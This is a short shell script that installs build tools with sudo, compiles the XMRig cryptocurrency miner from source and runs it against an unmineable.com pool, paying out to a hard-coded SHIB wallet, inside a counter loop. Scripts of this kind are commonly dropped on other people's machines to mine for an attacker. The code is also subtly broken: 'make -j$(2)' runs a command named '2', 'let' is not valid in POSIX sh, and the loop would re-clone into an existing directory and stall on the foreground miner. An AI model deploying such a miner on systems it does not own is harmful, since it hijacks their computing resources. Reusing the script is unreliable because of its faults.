#!/bin/sh
 
COUNTER=20
until [  $COUNTER -lt 10 ]; do
 
sudo apt-get update -y && sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y 
git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build &&  cmake .. && make -j$(2)  
./xmrig -a cn-heavy/xhv -o rx.unmineable.com:3333 -u SHIB:0xc2f39632e7a1f21487f0baa06ed220c4cb3085aa -k -t 2

 
     echo COUNTER $COUNTER
     let COUNTER-=1
done
